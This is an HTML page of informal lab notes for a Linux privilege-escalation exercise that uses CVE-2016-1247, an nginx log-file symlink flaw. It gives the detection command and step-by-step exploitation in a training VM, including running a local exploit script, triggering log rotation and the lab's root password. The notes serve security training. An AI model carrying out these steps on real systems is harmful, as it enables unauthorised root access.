<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Binary Symlinks</title>
</head><body>Escalation via Symlinks<br/>
<br/>
TLDR<br/>
<br/>
got Sbit set on SUDO and a vulnearble version of nginx <br/>
<br/>
Uses a vulnerbaility in the permiossion of the log files.<br/>
<br/>
Use automated tools to find.. ie linux exploit suggester.<br/>
<br/>
CVE-2016-1247<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: dpkg -l | grep nginx<br/>
2. From the output, notice that the installed nginx version is below 1.6.2-5+deb8u3.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM – Terminal 1<br/>
<br/>
1. For this exploit, it is required that the user be www-data. To simulate this escalate to root by typing: su root<br/>
2. The root password is password123<br/>
3. Once escalated to root, in command prompt type: su -l www-data<br/>
4. In command prompt type: /home/user/tools/nginx/nginxed-root.sh /var/log/nginx/error.log<br/>
5. At this stage, the system waits for logrotate to execute. In order to speed up the process, this will be simulated by connecting to the Linux VM via a different terminal.<br/>
<br/>
Linux VM – Terminal 2<br/>
<br/>
1. Once logged in, type: su root<br/>
2. The root password is password123<br/>
3. As root, type the following: invoke-rc.d nginx rotate &gt;/dev/null 2&gt;&amp;1<br/>
4. Switch back to the previous terminal.<br/>
<br/>
Linux VM – Terminal 1<br/>
<br/>
1. From the output, notice that the exploit continued its execution.<br/>
2. In command prompt type: id<br/>
</body></html>